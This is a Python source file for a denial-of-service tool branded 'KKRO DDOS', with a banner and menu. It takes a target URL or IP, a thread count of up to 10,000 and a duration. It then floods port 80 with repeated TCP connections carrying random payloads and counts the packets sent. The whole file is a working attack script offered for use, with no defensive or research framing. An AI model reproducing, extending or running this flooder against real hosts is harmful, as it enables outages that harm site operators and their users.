import os
import sys
import time
import socket
import threading
import random

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    RED = "\033[91m"
    RESET = "\033[0m"
    print(f"""{RED}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║  ██╗  ██╗██╗  ██╗██████╗  ██████╗     ██████╗ ██████╗   ║
║  ██║ ██╔╝██║ ██╔╝██╔══██╗██╔═══██╗    ██╔══██╗██╔══██╗  ║
║  █████╔╝ █████╔╝ ██████╔╝██║   ██║    ██║  ██║██║  ██║  ║
║  ██╔═██╗ ██╔═██╗ ██╔══██╗██║   ██║    ██║  ██║██║  ██║  ║
║  ██║  ██╗██║  ██╗██║  ██║╚██████╔╝    ██████╔╝██████╔╝  ║
║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝     ╚═════╝ ╚═════╝   ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝{RESET}
""")

def main():
    clear_screen()
    show_banner()
    
    print("[1] Start Attack")
    print("[2] Settings")
    print("[3] Exit")
    
    choice = input("\nSelect option: ")
    
    if choice == "1":
        start_attack()
    elif choice == "2":
        settings()
    elif choice == "3":
        sys.exit()
    else:
        print("Invalid option!")
        time.sleep(2)
        main()

def start_attack():
    clear_screen()
    show_banner()
    
    try:
        target = input("Enter Target URL/IP: ")
        threads = int(input("Number of Threads (1-10000): "))
        duration = int(input("Attack Duration (seconds): "))
        
        if not target:
            print("Target cannot be empty!")
            time.sleep(2)
            start_attack()
            return
            
        if threads < 1 or threads > 10000:
            print("Threads must be between 1-10000!")
            time.sleep(2)
            start_attack()
            return
            
        if duration < 1:
            print("Duration must be positive!")
            time.sleep(2)
            start_attack()
            return
        
        clear_screen()
        show_banner()
        
        target_ip = socket.gethostbyname(target)
        
        print(f"\nTarget: {target} ({target_ip})")
        print(f"Threads: {threads}")
        print(f"Duration: {duration} seconds")
        print(f"Port: 80")
        print("\n" + "="*50)
        print("ATTACK STARTED!")
        print("Press Ctrl+C to stop")
        print("="*50 + "\n")
        
        packets_sent = 0
        is_attacking = True
        
        def attack():
            nonlocal packets_sent
            while is_attacking:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target_ip, 80))
                    sock.send(random._urandom(1024))
                    packets_sent += 1
                    sock.close()
                except:
                    pass
        
        attack_threads = []
        for i in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            attack_threads.append(t)
            t.start()
        
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            print(f"\rTime: {elapsed}/{duration}s | Packets: {packets_sent}", end="")
            time.sleep(0.5)
        
        is_attacking = False
        time.sleep(1)
        
        print(f"\n\nAttack finished!")
        print(f"Total packets sent: {packets_sent}")
        print(f"Average packets/sec: {packets_sent/duration:.2f}")
        
        input("\nPress Enter to continue...")
        main()
        
    except socket.gaierror:
        print("Invalid target URL/IP!")
        time.sleep(2)
        start_attack()
    except ValueError:
        print("Invalid number input!")
        time.sleep(2)
        start_attack()
    except KeyboardInterrupt:
        print("\nAttack stopped by user!")
        input("\nPress Enter to continue...")
        main()

def settings():
    clear_screen()
    show_banner()
    
    print("[SETTINGS MENU]")
    print("\n[1] Change Default Port (Currently: 80)")
    print("[2] Change Packet Size (Currently: 1024)")
    print("[3] Back to Main Menu")
    
    choice = input("\nSelect option: ")
    
    if choice == "1":
        print("\nFeature in development...")
        time.sleep(2)
        settings()
    elif choice == "2":
        print("\nFeature in development...")
        time.sleep(2)
        settings()
    elif choice == "3":
        main()
    else:
        print("Invalid option!")
        time.sleep(2)
        settings()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nExiting KKRO DDOS...")
        sys.exit()